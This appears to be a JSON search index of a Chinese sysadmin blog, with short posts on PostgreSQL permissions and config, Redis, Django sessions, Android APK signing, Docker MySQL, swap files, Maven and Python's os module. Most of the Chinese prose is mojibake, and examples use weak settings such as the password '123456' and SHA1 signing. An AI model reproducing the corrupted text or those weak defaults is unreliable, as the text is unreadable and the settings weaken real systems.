12:12","objectID":"/post/1491/:0:0","tags":[],"title":"VMware Fusion ç«¯å£æ˜ å°„","uri":"/post/1491/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"1.ä½¿ç”¨ç®¡ç†å‘˜è¿æ¥pgsql # èµ‹äºˆæ‰€æœ‰è¡¨çš„æ‰€æœ‰æƒé™ç»™æŒ‡å®šç”¨æˆ· GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO \"ç”¨æˆ·å\"; # èµ‹äºˆæŒ‡å®šè¡¨çš„æ‰€æœ‰æƒé™ç»™æŒ‡å®šç”¨æˆ· GRANT ALL PRIVILEGES ON \"è¡¨å\" TO \"ç”¨æˆ·å\"; #ä¿®æ”¹åº“çš„æ‰€æœ‰è€… alter database åº“å owner to ç”¨æˆ·å; #æˆäºˆç”¨æˆ·åº“æƒé™ grant ALL ON DATABASE åº“å TO ç”¨æˆ·å; #æˆäºˆç”¨æˆ·æŒ‡å®šçš„åº“æƒé™ grant select on all tables in schema public to ç”¨æˆ·å; // åœ¨é‚£ä¸ªdbæ‰§è¡Œå°±æˆå“ªä¸ªdbçš„æƒé™ #ä¿®æ”¹è¡¨çš„æ‰€æœ‰è€… alter table è¡¨å owner to ç”¨æˆ·å; #æˆäºˆç”¨æˆ·è¡¨æƒé™ GRANT ALL ON è¡¨å TO ç”¨æˆ·å; #ä¿®æ”¹sequenceæ‰€æœ‰è€… alter sequence åºåˆ—å owner to ç”¨æˆ·å; #ä¿®æ”¹sequenceæƒé™ GRANT ALL ON åºåˆ—å TO ç”¨æˆ·å; # åªç»™æŒ‡å®šçš„è¡¨åªè¯»æƒé™ GRANT Usage ON SCHEMA \"schema1\" TO \"user1\"; GRANT Usage ON SCHEMA \"schema2\" TO \"user1\"; GRANT Select ON TABLE my_db.schema1.table1 TO \"user1\" GRANT Select ON TABLE my_db.schema2.table1 TO \"user1\" GRANT Select ON TABLE my_db.schema2.table2 TO \"user1\" ","date":"2020-03-05 12:12","objectID":"/post/1487/:0:0","tags":["pgsql"],"title":"Postgresè®¾ç½®ç”¨æˆ·è§’è‰²æƒé™","uri":"/post/1487/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"è¿›å…¥redisåè¾“å…¥info # Server redis_mode:standaloneÂ # è¿è¡Œæ¨¡å¼(å•ç‚¹) os:Linux 3.10.0-862.el7.x86_64 x86_64 process_id:6054Â # å½“å‰ Redis æœåŠ¡å™¨è¿›ç¨‹id run_id:4b68cdf840e00e7980e4b76ad65b5f81ac2e7af7 tcp_port:6379Â # ç«¯å£å· uptime_in_seconds:6641Â # è¿è¡Œå¤šå°‘ç§’ uptime_in_days:0Â # è¿è¡Œäº†å¤šå°‘å¤© # Clients connected_clients:2Â # å®¢æˆ·ç«¯è¿æ¥æ•°é‡ # Memory used_memory:875648Â # redisåˆ†é…å™¨åˆ†é…çš„å†…å­˜æ€»é‡ï¼ˆå•ä½byteï¼‰ used_memory_human:855.12KÂ # åŒä¸Šï¼Œå¯è¯»æ€§é«˜ used_memory_rss:14446592Â # redisè¿›ç¨‹å ç”¨çš„å†…å­˜ï¼ˆå•ä½byteï¼‰ used_memory_rss_human:13.78MÂ # åŒä¸Šï¼Œå¯è¯»æ€§é«˜ used_memory_peak:875648Â # used_memoryä½¿ç”¨çš„å³°å€¼ used_memory_peak_human:855.12KÂ # åŒä¸Šï¼Œå¯è¯»æ€§é«˜ # Persistence loading:0 rdb_changes_since_last_save:0Â # ä¸Šæ¬¡rdbä¿å­˜åï¼Œæ”¹å˜keyçš„æ¬¡æ•°ï¼ˆæ–°å¢å’Œä¿®æ”¹ï¼‰ rdb_bgsave_in_progress:0Â # å½“å‰æ˜¯å¦åœ¨è¿›è¡Œbgsaveï¼Œæ˜¯ä¸º1 rdb_last_save_time:1583302790Â # æœ€åä¸€æ¬¡è¿›è¡Œbgsaveä¿å­˜çš„æ—¶é—´æˆ³ rdb_last_bgsave_status:okÂ # æœ€åä¸€æ¬¡è¿›è¡Œbgsaveä¿å­˜çš„çŠ¶æ€ rdb_last_bgsave_time_sec:0Â # æœ€åä¸€æ¬¡è¿›è¡Œbgsaveä¿å­˜çš„èŠ±è´¹æ—¶é—´ aof_enabled:0Â # 0ä»£è¡¨æœªå¼€å¯aofæŒä¹…åŒ– # Stats total_connections_received:23Â #Â è¿è¡Œä»¥æ¥è¿æ¥è¿‡çš„å®¢æˆ·ç«¯çš„æ€»æ•°é‡ total_commands_processed:68Â #Â è¿è¡Œä»¥æ¥æ‰§è¡Œè¿‡çš„å‘½ä»¤çš„æ€»æ•°é‡ expired_keys:0Â # è¿è¡Œä»¥æ¥è¿‡æœŸçš„keyçš„æ•°é‡ evicted_keys:0Â #Â ç”±äº maxmemory é™åˆ¶ï¼Œè€Œè¢«å›æ”¶å†…å­˜çš„ key çš„æ€»æ•° keyspace_hits:11Â # æŸ¥è¯¢keyçš„å‘½ä¸­æ¬¡æ•° keyspace_misses:9Â # æ²¡å‘½ä¸­çš„æ¬¡æ•° pubsub_channels:0Â # å‘å¸ƒ/è®¢é˜…é¢‘é“æ•°é‡ pubsub_patterns:0Â # å‘å¸ƒ/è®¢é˜…æ¨¡å¼æ•°é‡ # Replication role:masterÂ # å½“å‰å®ä¾‹çš„è§’è‰² connected_slaves:0 master_replid:e9a2198fa7f05ecdf0c2bb272815867887580ba6 master_replid2:0000000000000000000000000000000000000000 master_repl_offset:0 second_repl_offset:-1 repl_backlog_active:0 repl_backlog_size:1048576 repl_backlog_first_byte_offset:0 repl_backlog_histlen:0 # CPU used_cpu_sys:5.549805Â used_cpu_user:5.548372 used_cpu_sys_children:0.053221 used_cpu_user_children:0.001071 # Cluster cluster_enabled:0 # Keyspace # ç»Ÿè®¡æ¯ä¸ªåº“ä¸­keyçš„å­˜æ´»æ•°é‡,è¿‡æœŸæ•°é‡ï¼Œå¹³å‡ç”Ÿå­˜æ—¶é—´(å•ä½æ¯«ç§’) db0:keys=4,expires=0,avg_ttl=0 db1:keys=1,expires=1,avg_ttl=1205425200 ","date":"2020-03-04 16:24","objectID":"/post/1481/:0:0","tags":["redis"],"title":"redisä¸­infoå‚æ•°å«ä¹‰","uri":"/post/1481/"},{"categories":["python"],"content":"1.å®‰è£…django-redis-sessionsæ¨¡å— 2.djangoä¸­settings.pyé…ç½® SESSION_ENGINE = 'redis_sessions.session' SESSION_REDIS = { 'host': '10.0.0.200', 'port': 6379, 'db': 1, 'password': '', 'prefix': 'session', 'socket_timeout': 1 } 3.ç¼–å†™è§†å›¾å‡½æ•°views.py def set_session(request): request.session['username'] = 'soulchild' return HttpResponse('è®¾ç½®session') def get_session(request): res = request.session.get('username') return HttpResponse(res) 4.é…ç½®è·¯ç”±urls.py url(r'^set_session$', views.set_session, name='set_session'), url(r'^get_session$', views.get_session, name='get_session'), 5.éªŒè¯ å¯åŠ¨django python manage.py runserver æ‰“å¼€ï¼šhttp://127.0.0.1:8000/set_session æŸ¥çœ‹redis æ‰“å¼€ï¼šhttp://127.0.0.1:8000/get_session ç»“æœæ­£å¸¸æ˜¾ç¤º å…³äºå“¨å…µæ¨¡å¼å’Œé›†ç¾¤å¯å‚è€ƒï¼š https://pypi.org/project/django-redis-sessions/","date":"2020-03-04 14:26","objectID":"/post/1471/:0:0","tags":["redis","python"],"title":"djangoä¸­ä½¿ç”¨rediså­˜å‚¨session","uri":"/post/1471/"},{"categories":["python"],"content":"1.å®‰è£…redisæ¨¡å— 2.ä»£ç  import redis if __name__ == '__main__': try: # åˆ›å»ºè¿æ¥å¯¹è±¡ sr = redis.Redis(host='10.0.0.200') # è®¾ç½®ä¸€ä¸ªkvå€¼,(è¿”å›è®¾ç½®ç»“æœtrueï¼Œfalse) # res = sr.set('name', 'soulchild') # print(res) # è·å–ä¸€ä¸ªkeyå¯¹åº”çš„å€¼ # res = sr.get('name') # print(res) # åˆ é™¤keyï¼ˆåˆ é™¤æˆåŠŸå‡ ä¸ªå°±è¿”å›å‡ ï¼‰ # print(sr.delete('a', 'b', 'c')) # è·å–æ‰€æœ‰key # res = sr.keys() # print(res) # è·å–æ‰€æœ‰ä»¥nå¼€å¤´çš„key # res = sr.keys('n*') # print(res) except Exception as e: print(e)","date":"2020-03-04 14:01","objectID":"/post/1467/:0:0","tags":["redis","python"],"title":"pythonæ“ä½œredis","uri":"/post/1467/"},{"categories":["kubernetes"],"content":"ä¿®æ”¹é…ç½®æ–‡ä»¶ spec: containers: - name: envar-demo-container image: gcr.io/google-samples/node-hello:1.0 env: - name: JAVA_OPTS value: \"-Xms500m -Xmx950m -XX:MaxNewSize=250m -XX:+UseConcMarkSweepGC\"","date":"2020-03-03 17:32","objectID":"/post/1462/:0:0","tags":["k8s"],"title":"k8sä½¿ç”¨envæ§åˆ¶å®¹å™¨ç¯å¢ƒå˜é‡","uri":"/post/1462/"},{"categories":["å…¶ä»–"],"content":"1.å®‰è£…jdkç¯å¢ƒ https://soulchild.cn/470.html 2.å®‰è£…android sdk wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip mkdir -p /opt/android/sdk unzip sdk-tools-linux-3859397.zip -d /opt/android/sdk cd /opt/android/sdk/tools/bin/ ./sdkmanager â€œbuild-tools;27.0.3â€ â€œplatforms;android-27â€ â€œplatform-toolsâ€ â€œndk-bundleâ€ â€œextras;android;m2repositoryâ€ â€œextras;google;m2repositoryâ€ â€œextras;m2repository;com;android;support;constraint;constraint-layout;1.0.2â€ â€œtoolsâ€ or ./sdkmanager â€“licenses 3.å®‰è£…gradle wget https://services.gradle.org/distributions/gradle-5.1.1-all.zip mkdir /opt/gradle/ unzip gradle-5.1.1-all.zip -d /opt/gradle/ é…ç½®ç¯å¢ƒå˜é‡ export ANDROID_HOME=/opt/android/sdk PATH=$PATH:$ANDROID_HOME:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools:$ANDROID_HOME/emulator:$ANDROID_HOME/tools/bin export PATH=$PATH:/opt/gradle/gradle-5.1.1/bin Â  4.ç”Ÿæˆç­¾åæ–‡ä»¶ mkdir ~/keys cd ~/keys keytool -genkey -v -keystore dao_flashcard.keystore -alias flashcard -keyalg RSA -validity 20000 å‚æ•°è¯´æ˜ï¼š 1ï¼‰keytoolæ˜¯å·¥å…·åç§°ï¼Œ-genkeyæ„å‘³ç€æ‰§è¡Œçš„æ˜¯ç”Ÿæˆæ•°å­—è¯ä¹¦æ“ä½œï¼Œ-vè¡¨ç¤ºå°†ç”Ÿæˆè¯ä¹¦çš„è¯¦ç»†ä¿¡æ¯æ‰“å°å‡ºæ¥ 2ï¼‰dao_flashcard.keystoreè¡¨ç¤ºç”Ÿæˆçš„æ•°å­—è¯ä¹¦çš„æ–‡ä»¶åä¸ºâ€œdao_flashcard.keystoreâ€ï¼› 3ï¼‰-alias flashcardè¡¨ç¤ºè¯ä¹¦çš„åˆ«åä¸ºâ€œflashcard\"ï¼Œå½“ç„¶å¯ä»¥ä¸å’Œä¸Šé¢çš„æ–‡ä»¶åä¸€æ ·ï¼› 4ï¼‰-keyalg RSAÂ è¡¨ç¤ºç”Ÿæˆå¯†é’¥æ–‡ä»¶æ‰€é‡‡ç”¨çš„ç®—æ³•ä¸ºRSAï¼› 5ï¼‰-validity 20000 è¡¨ç¤ºè¯¥æ•°å­—è¯ä¹¦çš„æœ‰æ•ˆæœŸä¸º20000å¤©ï¼Œæ„å‘³ç€20000å¤©ä¹‹åè¯¥è¯ä¹¦å°†å¤±æ•ˆ 5.æ„å»ºapkåŒ… cd /android_app/ gradle clean gradle assembleRelease cp app/build/outputs/apk/release/xxx.apk ~/keys 6.ç»™apkç­¾å #apkå’Œç­¾åæ–‡ä»¶åœ¨åŒä¸€ç›®å½• jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore dao_flashcard.keystore -signedjar new.apk xxx.apk flashcard ","date":"2020-02-28 09:49","objectID":"/post/1458/:0:0","tags":[],"title":"gradleæ‰“åŒ…APK,å¹¶ä½¿ç”¨jarsignerç­¾å","uri":"/post/1458/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"create database database_name default character set utf8mb4 collate utf8mb4_unicode_ci; ","date":"2020-02-21 10:49","objectID":"/post/1456/:0:0","tags":["mysql"],"title":"mysqlåˆ›å»ºåº“utf8_mb4","uri":"/post/1456/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":" #æŒ‡å®šæ•°æ®æ–‡ä»¶ç›®å½• data_directory = '/data/postgresql/' #ç›‘å¬åœ°å€ listen_addresses = '*' #æœ€å¤§è¿æ¥æ•° max_connections = 1000 æŸ¥è¯¢sqlï¼šSELECT sum(numbackends) FROM pg_stat_database; #å¤„ç†tcpè¿æ¥ tcp_keepalives_idle = 0 tcp_keepalives_interval = 0 tcp_keepalives_count = 0 å¯¹äºæ¯ä¸ªè¿æ¥ï¼Œpostgresqlä¼šå¯¹è¿™ä¸ªè¿æ¥ç©ºé—²tcp_keepalives_idleç§’åï¼Œä¸»åŠ¨å‘é€tcp_keepliveåŒ…ç»™å®¢æˆ· ç«¯ï¼Œä»¥ä¾¦æ¢å®¢æˆ·ç«¯æ˜¯å¦è¿˜æ´»ç€Â ï¼Œå½“å‘é€tcp_keepalives_countä¸ªä¾¦æ¢åŒ…ï¼Œæ¯ä¸ªä¾¦æ¢åŒ…åœ¨tcp_keepalives_interval ç§’å†…æ²¡æœ‰å›åº”ï¼Œpostgresqlå°±è®¤ä¸ºè¿™ä¸ªè¿æ¥æ˜¯æ­»çš„ã€‚äºæ˜¯åˆ‡æ–­è¿™ä¸ªæ­»è¿æ¥ã€‚å‚æ•°è®¾ç½®ä¸ºoæ—¶ï¼Œä½¿ç”¨ç³»ç»Ÿé»˜è®¤å€¼ã€‚ å¯¹åº”å…³ç³»ï¼š tcp_keepalives_idleÂ == tcp_keepalive_time tcp_keepalives_interval == tcp_keepalives_interval tcp_keepalives_count ==Â tcp_keepalive_probes #ç¼“å­˜å¤§å° shared_buffers = 128MB #å¯åŠ¨æ—¥å¿—æ”¶é›†ï¼Œ è¿™æ˜¯ä¸€ä¸ªåå°è¿›ç¨‹ï¼ŒæŠ“å–å‘é€åˆ°stderrçš„æ—¥å¿—æ¶ˆæ¯ï¼Œå¹¶ä¼šå°†ä»–ä»¬é‡å®šå‘åˆ°æ—¥å¿—æ–‡ä»¶ã€‚ logging_collector = on #æ—¥å¿—ç±»å‹,éœ€è¦å…ˆå¼€å¯logging_collector log_destination = 'stderr' #æ—¥å¿—ç›®å½• log_directory = 'pg_log' #æ—¥å¿—å log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log' #å½“æ—¥å¿—æ–‡ä»¶å·²å­˜åœ¨æ—¶ï¼Œè¯¥é…ç½®å¦‚æœä¸ºoffï¼Œæ–°ç”Ÿæˆçš„æ—¥å¿—å°†åœ¨æ–‡ä»¶å°¾éƒ¨è¿½åŠ ï¼Œå¦‚æœä¸ºonï¼Œåˆ™ä¼šè¦†ç›–åŸæ¥çš„æ—¥å¿—ã€‚ log_truncate_on_rotation = off å•ä¸ªæ—¥å¿—æ–‡ä»¶çš„ç”Ÿå­˜æœŸï¼Œé»˜è®¤1å¤©ï¼Œåœ¨æ—¥å¿—æ–‡ä»¶å¤§å°æ²¡æœ‰è¾¾åˆ°10Mæ—¶ï¼Œä¸€å¤©åªç”Ÿæˆä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ log_rotation_age = 7d å•ä¸ªæ—¥å¿—æ–‡ä»¶çš„å¤§å°ï¼Œå¦‚æœæ—¶é—´æ²¡æœ‰è¶…è¿‡7å¤©ï¼Œä¸€ä¸ªæ—¥å¿—æ–‡ä»¶æœ€å¤§åªèƒ½åˆ°10Mï¼Œå¦åˆ™å°†æ–°ç”Ÿæˆä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ã€‚ log_rotation_size = 10MB #è®°å½•æ¯æ¡SQLè¯­å¥æ‰§è¡Œå®Œæˆæ¶ˆè€—çš„æ—¶é—´ log_duration = on #-1è¡¨ç¤ºä¸å¯ç”¨ï¼Œ0å°†è®°å½•æ‰€æœ‰SQLè¯­å¥å’Œå®ƒä»¬çš„è€—æ—¶ï¼Œå¤§äº0åªè®°å½•é‚£äº›è€—æ—¶è¶…è¿‡ï¼ˆæˆ–ç­‰äºï¼‰è¿™ä¸ªå€¼ï¼ˆmsï¼‰çš„SQLè¯­å¥ã€‚ log_min_duration_statement = 5000 #è®°å½•ç”¨æˆ·è¿æ¥æ—¥å¿— log_connections = on #è®°å½•ç”¨æˆ·æ–­å¼€è¿æ¥çš„æ—¥å¿— log_disconnections = on #é…ç½®æ—¥å¿—æ ¼å¼ log_line_prefix = '\u003c %m %p %u %d %r \u003e' #æ§åˆ¶è®°å½•å“ªäº›SQLè¯­å¥ã€‚noneä¸è®°å½•ï¼Œddlè®°å½•æ‰€æœ‰æ•°æ®å®šä¹‰å‘½ä»¤ï¼Œæ¯”å¦‚CREATE,ALTER,å’ŒDROP è¯­å¥ã€‚modè®°å½•æ‰€æœ‰ddlè¯­å¥,åŠ ä¸Šæ•°æ®ä¿®æ”¹è¯­å¥INSERT,UPDATEç­‰,allè®°å½•æ‰€æœ‰æ‰§è¡Œçš„è¯­å¥ï¼Œå°†æ­¤é…ç½®è®¾ç½®ä¸ºallå¯è·Ÿè¸ªæ•´ä¸ªæ•°æ®åº“æ‰§è¡Œçš„SQLè¯­å¥ã€‚ log_statement = 'ddl' #æ—¥å¿—æ ¼å¼ datestyle = 'iso, mdy' #æ—¶åŒºè®¾ç½® log_timezone = 'Asia/Shanghai' ","date":"2020-02-21 09:27","objectID":"/post/1450/:0:0","tags":["postgresql","pgsql"],"title":"pgsqlé…ç½®æ–‡ä»¶è¯´æ˜","uri":"/post/1450/"},{"categories":["python"],"content":"1.å®‰è£…djangoæ¡†æ¶ pip install django 2.åˆ›å»ºä¸€ä¸ªé¡¹ç›® django-admin startproject test 3.åˆ›å»ºä¸€ä¸ªAPP cd test python startapp app01 ä¿®æ”¹settings.py 4.æ³¨å†Œapp01 INSTALLED_APPSæ·»åŠ app01 5.ä¿®æ”¹è¯­è¨€å’Œæ—¶åŒº LANGUAGE_CODE = 'zh-hans' TIME_ZONE = 'Asia/Shanghai' # ä¸ä½¿ç”¨å›½é™…æ—¶é—´ USE_TZ = False 6.é…ç½®é™æ€æ–‡ä»¶ç›®å½• # æ–‡ä»¶æœ«å°¾æ·»åŠ  STATICFILES_DIRS = [ os.path.join(BASE_DIR, \"static\") ] 7.é…ç½®é™æ€æ–‡ä»¶çš„URL # è¿™ä¸ªè·¯å¾„æŒ‡çš„æ˜¯æµè§ˆå™¨ä¸­urlä¸­çš„è·¯å¾„ï¼ŒSTATICFILES_DIRSæ˜¯æŒ‡pythonæŸ¥æ‰¾æ–‡ä»¶çš„è·¯å¾„ STATIC_URL = '/static/' ","date":"2020-02-19 18:05","objectID":"/post/1444/:0:0","tags":["python","django"],"title":"django-åˆ›å»ºé¡¹ç›®","uri":"/post/1444/"},{"categories":["docker"],"content":"æ‡’ç—…: docker run -d -p3306:3306 --name mysqld -e MYSQL_ROOT_PASSWORD=123456 -v /mysql-server/mysql-data/:/var/lib/mysql -v /mysql-server/mysql-conf/:/etc/mysql/conf.d mysql:5.7.20 ","date":"2020-02-14 11:43","objectID":"/post/2416/:0:0","tags":["mysql","docker"],"title":"dockerå¿«é€Ÿè¿è¡Œmysql5.7.20","uri":"/post/2416/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1ã€/etc/issueÂ æœ¬åœ°ç™»å½•å‰çš„æ˜¾ç¤º 2ã€/etc/issue.netÂ ä½¿ç”¨ç½‘ç»œç™»é™†å‰æ˜¾ç¤º 3ã€/etc/motdÂ ç™»é™†åæ˜¾ç¤º \\d //æœ¬åœ°ç«¯æ—¶é—´çš„æ—¥æœŸï¼› \\l //æ˜¾ç¤ºå½“å‰ttyçš„åå­—å³ç¬¬å‡ ä¸ªttyï¼› \\m //æ˜¾ç¤ºç¡¬ä½“çš„æ¶æ„ (i386/i486/i586/i686...)ï¼› \\n //æ˜¾ç¤ºä¸»æœºçš„ç½‘è·¯åç§°ï¼› \\o //æ˜¾ç¤º domain nameï¼› \\r //å½“å‰ç³»ç»Ÿçš„ç‰ˆæœ¬ (ç›¸å½“äº uname -r) \\t //æ˜¾ç¤ºæœ¬åœ°ç«¯æ—¶é—´çš„æ—¶é—´ï¼› \\u //å½“å‰æœ‰å‡ ä¸ªç”¨æˆ·åœ¨çº¿ã€‚ \\s //å½“å‰ç³»ç»Ÿçš„åç§°ï¼› \\v //å½“å‰ç³»ç»Ÿçš„ç‰ˆæœ¬ã€‚ ","date":"2020-02-13 22:46","objectID":"/post/1435/:0:0","tags":[],"title":"linuxç™»é™†æç¤ºä¿¡æ¯","uri":"/post/1435/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":" #åˆ›å»ºç”¨æˆ·è§’è‰² CREATE USER user_name WITH PASSWORD '123456'; #åˆ›å»ºæ•°æ®åº“è®¾ç½®æ‰€æœ‰è€… CREATE DATABASE database_name OWNER user_name; #å°†database_nameæ•°æ®åº“æˆæƒç»™user_nameç”¨æˆ· GRANT ALL PRIVILEGES ON DATABASE database_nname TO user_name;","date":"2020-02-11 13:06","objectID":"/post/1432/:0:0","tags":["postgresql","pgsql"],"title":"pgsqlåˆ›å»ºåº“ã€ç”¨æˆ·ã€æˆæƒ","uri":"/post/1432/"},{"categories":["python"],"content":"1ã€ str__å’Œ__repr å½“ä½¿ç”¨printæ‰“å°å¯¹è±¡æ—¶ï¼Œstræ–¹æ³•çš„è¿”å›å€¼å°±æ˜¯printçš„ç»“æœã€‚ï¼ˆreprå’Œstrç±»ä¼¼ï¼Œ__str__æ˜¯é¢å‘ç”¨æˆ·çš„ï¼Œè€Œ__repr__é¢å‘ç¨‹åºå‘˜ï¼‰ 2ã€del __del__åœ¨å¯¹è±¡é”€æ¯çš„æ—¶å€™è¢«è°ƒç”¨. ","date":"2020-02-08 22:51","objectID":"/post/1429/:0:0","tags":["python"],"title":"python_ç±»çš„å†…ç½®æ–¹æ³•","uri":"/post/1429/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"åˆ›å»ºè™šæ‹Ÿå†…å­˜è®¾å¤‡ï¼ˆ2gï¼‰ mkdirÂ /swap dd if=/dev/zero of=/swap/swap2g bs=1024k count=2000 mkswap /swap/swap2g chmod 600 /swap/swap2g swapon /swap/swap2g æŸ¥çœ‹swapåˆ†åŒºä¿¡æ¯ swapon -s cat /proc/swaps ","date":"2020-02-06 19:14","objectID":"/post/1425/:0:0","tags":[],"title":"å¯ç”¨è™šæ‹Ÿå†…å­˜swap","uri":"/post/1425/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"å‚æ•°è¯´æ˜ï¼š cleanï¼šæ¸…é™¤ä¸Šä¸€æ¬¡çš„æ„å»º packageï¼šä»…æ‰“åŒ…ã€æµ‹è¯• installï¼šæŠŠæ‰“å¥½çš„åŒ…å‘å¸ƒè‡³æœ¬åœ°ä»“åº“ï¼Œä»¥å¤‡æœ¬åœ°çš„å…¶å®ƒé¡¹ç›®ä½œä¸ºä¾èµ–ä½¿ç”¨ deployï¼šæŠŠæ‰“å¥½çš„åŒ…å‘å¸ƒè‡³æœ¬åœ°ä»“åº“å’Œè¿œç¨‹ä»“åº“ -Uï¼šå¼ºåˆ¶æ›´æ–°snapshotç±»å‹çš„æ’ä»¶æˆ–ä¾èµ–åº“ -plï¼šæ‰‹åŠ¨æŒ‡å®šæ„å»ºæ¨¡å—ï¼Œæ¨¡å—é—´ä»¥é€—å·åˆ†éš” -amï¼šè‡ªåŠ¨æ„å»ºæŒ‡å®šæ¨¡å—çš„ä¾èµ–æ¨¡å— -Tï¼šçº¿ç¨‹è®¡æ•°ï¼Œä¾‹å¦‚-T 2Cï¼Œå…¶ä¸­Cæ˜¯æ ¸å¿ƒæ•°ï¼Œä¸¤è€…ç›¸ä¹˜å³ä¸ºæ€»çº¿ç¨‹æ•° -Dmaven.compile.fork=trueï¼šä½¿ç”¨å¤šçº¿ç¨‹ç¼–è¯‘ -Dmaven.test.skip=trueï¼šè·³è¿‡æµ‹è¯•ä»£ç çš„ç¼–è¯‘ æŒ‡å®šæ¨¡å—ç¼–è¯‘ï¼š mvn -U -pl blade-service/xxxx -am clean package åŠ é€Ÿç¼–è¯‘ï¼š mvn clean install -T 1C -Dmaven.compile.fork=true -Dmaven.test.skip=true å®Œæ•´ç¼–è¯‘å‚æ•°ï¼š mvnÂ clean package -U -pl xxx-service/xxxx -amÂ -TÂ 2CÂ -Dmaven.compile.fork=true","date":"2020-02-06 02:31","objectID":"/post/1417/:0:0","tags":["maven"],"title":"mavenå‘½ä»¤ç¼–è¯‘å¸¸ç”¨å‚æ•°","uri":"/post/1417/"},{"categories":["python"],"content":"OSæ¨¡å— os.getcwd() è·å–å½“å‰å·¥ä½œç›®å½•ï¼Œå³å½“å‰pythonè„šæœ¬å·¥ä½œçš„ç›®å½•è·¯å¾„ os.chdir(\"dirname\") æ”¹å˜å½“å‰è„šæœ¬å·¥ä½œç›®å½•ï¼›ç›¸å½“äºshellä¸‹cd os.curdir è¿”å›å½“å‰ç›®å½•: ('.') os.pardir è·å–å½“å‰ç›®å½•çš„çˆ¶ç›®å½•å­—ç¬¦ä¸²åï¼š('..') os.makedirs('dirname1/dirname2') å¯ç”Ÿæˆå¤šå±‚é€’å½’ç›®å½• os.removedirs('dirname1') è‹¥ç›®å½•ä¸ºç©ºï¼Œåˆ™åˆ é™¤ï¼Œå¹¶é€’å½’åˆ°ä¸Šä¸€çº§ç›®å½•ï¼Œå¦‚è‹¥ä¹Ÿä¸ºç©ºï¼Œåˆ™åˆ é™¤ï¼Œä¾æ­¤ç±»æ¨ os.mkdir('dirname') ç”Ÿæˆå•çº§ç›®å½•ï¼›ç›¸å½“äºshellä¸­mkdir dirname os.rmdir('dirname') åˆ é™¤å•çº§ç©ºç›®å½•ï¼Œè‹¥ç›®å½•ä¸ä¸ºç©ºåˆ™æ— æ³•åˆ é™¤ï¼ŒæŠ¥é”™ï¼›ç›¸å½“äºshellä¸­rmdir dirname os.listdir('dirname') åˆ—å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ï¼Œå¹¶ä»¥åˆ—è¡¨æ–¹å¼æ‰“å° os.remove() åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ os.rename(\"oldname\",\"newname\") é‡å‘½åæ–‡ä»¶/ç›®å½• os.stat('path/filename') è·å–æ–‡ä»¶/ç›®å½•ä¿¡æ¯ os.sep è¾“å‡ºæ“ä½œç³»ç»Ÿç‰¹å®šçš„è·¯å¾„åˆ†éš”ç¬¦ï¼Œwinä¸‹ä¸º\"\\\\\",Linuxä¸‹ä¸º\"/\" os.linesep è¾“å‡ºå½“å‰å¹³å°ä½¿ç”¨çš„è¡Œç»ˆæ­¢ç¬¦ï¼Œwinä¸‹ä¸º\"\\r\\n\",Linuxä¸‹ä¸º\"\\n\" os.pathsep è¾“å‡ºç”¨äºåˆ†å‰²æ–‡ä»¶è·¯å¾„çš„å­—ç¬¦ä¸² winä¸‹ä¸º;,Linuxä¸‹ä¸º: os.name è¾“å‡ºå­—ç¬¦ä¸²æŒ‡ç¤ºå½“å‰ä½¿ç”¨å¹³å°ã€‚win-\u003e'nt'; Linux-\u003e'posix' os.system(\"bash command\") è¿è¡Œshellå‘½ä»¤ï¼Œç›´æ¥æ˜¾ç¤º os.environ è·å–ç³»ç»Ÿç¯å¢ƒå˜é‡ os.path.abspath(path) è¿”å›pathè§„èŒƒåŒ–çš„ç»å¯¹è·¯å¾„ os.path.split(path) å°†pathåˆ†å‰²æˆç›®å½•å’Œæ–‡ä»¶åäºŒå…ƒç»„è¿”å› os.path.dirname(path) è¿”å›pathçš„ç›®å½•ã€‚å…¶å®å°±æ˜¯os.path.split(path)çš„ç¬¬ä¸€ä¸ªå…ƒç´  os.path.basename(path) è¿”å›pathæœ€åçš„æ–‡ä»¶åã€‚å¦‚ä½•pathä»¥ï¼æˆ–\\ç»“å°¾ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›ç©ºå€¼ã€‚å³os.path.split(path)çš„ç¬¬äºŒä¸ªå…ƒç´  os.path.exists(path) å¦‚æœpathå­˜åœ¨ï¼Œè¿”å›Trueï¼›å¦‚æœpathä¸å­˜åœ¨ï¼Œè¿”å›False os.path.isabs(path) å¦‚æœpathæ˜¯ç»å¯¹è·¯å¾„ï¼Œè¿”å›True os.path.isfile(path) å¦‚æœpathæ˜¯ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶ï¼Œè¿”å›Trueã€‚å¦åˆ™è¿”å›False os.path.isdir(path) å¦‚æœpathæ˜¯ä¸€ä¸ªå­˜åœ¨çš„ç›®å½•ï¼Œåˆ™è¿”å›Trueã€‚å¦åˆ™è¿”å›False os.path.join(path1[, path2[, ...]]) å°†å¤šä¸ªè·¯å¾„ç»„åˆåè¿”å›ï¼Œç¬¬ä¸€ä¸ªç»å¯¹è·¯å¾„ä¹‹å‰çš„å‚æ•°å°†è¢«å¿½ç•¥ os.path.getatime(path) è¿”å›pathæ‰€æŒ‡å‘çš„æ–‡ä»¶æˆ–è€…ç›®å½•çš„æœ€åå­˜å–æ—¶é—´ os.path.getmtime(path) è¿”å›pathæ‰€æŒ‡å‘çš„æ–‡ä»¶æˆ–è€…ç›®å½•çš„æœ€åä¿®æ”¹æ—¶é—´ os.path.getsize(path) è¿”å›pathçš„å¤§å°","date":"2020-02-02 